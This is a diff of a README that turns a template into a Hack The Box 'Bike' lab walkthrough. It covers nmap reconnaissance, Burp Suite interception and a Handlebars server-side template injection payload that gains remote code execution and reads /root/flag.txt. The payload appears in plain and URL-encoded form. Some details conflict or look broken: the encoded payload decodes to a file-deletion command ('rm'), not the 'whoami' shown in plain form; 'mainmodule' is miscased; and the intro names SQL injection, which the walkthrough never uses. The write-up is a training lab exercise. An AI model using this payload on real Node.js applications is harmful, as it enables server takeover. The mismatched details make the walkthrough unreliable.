@@ -17,36 +17,20 @@
 *** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
 *** https://www.markdownguide.org/basic-syntax/#reference-style-links
 -->
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![MIT License][license-shield]][license-url]
-[![LinkedIn][linkedin-shield]][linkedin-url]
-
 
 
 <!-- PROJECT LOGO -->
+<!-- PROJECT LOGO -->
 <br />
 <div align="center">
-  <a href="https://github.com/othneildrew/Best-README-Template">
-    <img src="images/logo.png" alt="Logo" width="80" height="80">
-  </a>
+  <h1 align="center">Hack The Box</h1>
+  <br>
+  
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/images/htb%20logo.png">
 
-  <h3 align="center">Best-README-Template</h3>
+  
 
-  <p align="center">
-    An awesome README template to jumpstart your projects!
-    <br />
-    <a href="https://github.com/othneildrew/Best-README-Template"><strong>Explore the docs »</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/othneildrew/Best-README-Template">View Demo</a>
-    ·
-    <a href="https://github.com/othneildrew/Best-README-Template/issues">Report Bug</a>
-    ·
-    <a href="https://github.com/othneildrew/Best-README-Template/issues">Request Feature</a>
-  </p>
+<h3 align="center">Project Module - Red Teaming</h3>
 </div>
 
 
@@ -82,71 +66,93 @@
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-[![Product Name Screen Shot][product-screenshot]](https://example.com)
+Hack The Box is an online platform for ethical hacking and penetration testing practice. The platform offers a variety of virtual machines and challenges that simulate real-world cybersecurity scenarios.
 
-There are many great README templates available on GitHub; however, I didn't find one that really suited my needs so I created this enhanced one. I want to create a README template so amazing that it'll be the last one you ever need -- I think this is it.
+Users can practice a wide range of hacking techniques, including:<br>
 
-Here's why:
-* Your time should be focused on creating something amazing. A project that solves a problem and helps others
-* You shouldn't be doing the same tasks over and over like creating a README from scratch
-* You should implement DRY principles to the rest of your life :smile:
-
-Of course, no one template will serve all projects since your needs may be different. So I'll be adding more in the near future. You may also suggest changes by forking this repo and creating a pull request or opening an issue. Thanks to all the people have contributed to expanding this template!
-
-Use the `BLANK_README.md` to get started.
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-
-
-### Built With
-
-This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.
-
-* [![Next][Next.js]][Next-url]
-* [![React][React.js]][React-url]
-* [![Vue][Vue.js]][Vue-url]
-* [![Angular][Angular.io]][Angular-url]
-* [![Svelte][Svelte.dev]][Svelte-url]
-* [![Laravel][Laravel.com]][Laravel-url]
-* [![Bootstrap][Bootstrap.com]][Bootstrap-url]
-* [![JQuery][JQuery.com]][JQuery-url]
+● Network scanning and reconnaissance<br>
+● Exploitation of vulnerabilities<br>
+● Web application hacking and testing<br>
+● Cryptography and steganography<br>
+● Reverse engineering<br>
+● Forensics and analysis of digital evidence<br>
+● Privilege escalation<br>
+Hack The Box provides a safe and legal environment for users to practice their skills and learn new techniques in a controlled setting. It is an excellent resource for individuals who are interested in cybersecurity, whether they are just starting or looking to enhance their existing knowledge and skills. However, it is important to note that using Hack The Box for unethical or illegal activities is strictly prohibited and can lead to serious consequences.
 
 <p align="right">(<a href="#top">back to top</a>)</p>
+
 
 
 
 <!-- GETTING STARTED -->
-## Getting Started
+# 1. Bike
 
-This is an example of how you may give instructions on setting up your project locally.
-To get a local copy up and running follow these simple example steps.
+In the "Tier 1 Bike" challenge, users are tasked with gaining access to a web server that is vulnerable to common web application attacks, such as SQL injection and command injection. The objective is to find and exploit these vulnerabilities to gain access to the server and retrieve a flag file.
 
-### Prerequisites
+### Process
 
-This is an example of how to list things you need to use the software and how to install them.
-* npm
+After active the machine I got a ip-10.129.213.238. Now I need to Network scanning and reconnaissance & in this case i use nmap.
+* nmap
   ```sh
-  npm install npm@latest -g
+  nmap -sS -V 10.129.213.238
   ```
+<p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/nmap%20scan.png">
+</p>
+I got 22-SSH port and 80-http port open after the scanning.<br><br>
+Go to http://10.129.213.238/ ----->  open Burpsuite ----> take the post request by intercept on of the Burpsuite ----> take the Request on Repeater.<br>
+Here I use the Handlebars (NodeJS) Payload
 
-### Installation
-
-_Below is an example of how you can instruct your audience on installing and setting up your app. This template doesn't rely on any external dependencies or services._
-
-1. Get a free API Key at [https://example.com](https://example.com)
-2. Clone the repo
    ```sh
-   git clone https://github.com/your_username_/Project-Name.git
+   {{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+```sh
+   URLencoded:
+%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
    ```
-3. Install NPM packages
+   
+* Burpsuite<br>
+Here i apply the Handlebars (NodeJS) URL encoded Payload on post request's email section. But I got server error code 500.<br>
+<p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/apply%20payload%20with%20url%20encode.png">
+</p>
+For avoid these error I replace the process.mainmodule.require instead of return require.
+
    ```sh
-   npm install
-   ```
-4. Enter your API in `config.js`
-   ```js
-   const API_KEY = 'ENTER YOUR API';
-   ```
+   {{this.push "process.mainmodule.require('child_process').execSync('whoami');"}}
+```
+
+ And Here I got the RCE.
+ <p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/payload%20to%20gain%20rce.png">
+</p>
+After replace the cat /root/flag.txt instead of whoami, There I got the root flag.
+
+   ```sh
+   {{this.push "process.mainmodule.require('child_process').execSync('cat /root/flag.txt');"}}
+```
+
+  <p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/root%20flag.png">
+</p>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
